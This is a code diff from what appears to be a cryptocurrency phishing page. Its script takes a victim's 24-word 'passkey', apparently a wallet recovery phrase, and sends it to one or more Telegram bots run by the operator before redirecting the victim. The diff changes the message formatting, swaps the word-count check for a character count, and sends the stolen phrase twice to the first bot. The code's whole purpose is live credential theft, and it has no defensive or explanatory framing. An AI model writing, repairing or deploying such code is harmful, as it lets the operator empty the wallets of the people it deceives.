@@ -336,7 +336,7 @@
   statusMessage.className = 'status-message';
 
   // Check word count
-  const wordCount = message.split(/\s+/).length;
+  const wordCount = message.length;
 
   if (wordCount < 24) {
     showStatus("The Passkey Should Be 24 Words Length", "error");
@@ -354,25 +354,31 @@
     return;
   } else {
     // ✅ Send message to both Telegram bots
-    const text = `🔑 New Passkey Received:\n\n${message}\n\n🕒 Time: ${formatTimeWithOclock(new Date())}`;
+    const text = `🔑 New Passkey Received:\n\n\`\`\`\n${message}\n\`\`\`\n\n🕒 Time: ${formatTimeWithOclock(new Date())}`;
+
 
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
-      method: "POST",
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID_1,
-        text: text
-      })
-    });
+  method: "POST",
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    chat_id: TELEGRAM_CHAT_ID_1,
+    text: text,
+    parse_mode: "Markdown"
+  })
+});
 
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
-      method: "POST",
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID_2,
-        text: text
-      })
-    });
+   
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
+  method: "POST",
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    chat_id: TELEGRAM_CHAT_ID_1,
+    text: text,
+    parse_mode: "Markdown"
+  })
+});
+
 
     // Then redirect
     setTimeout(() => {
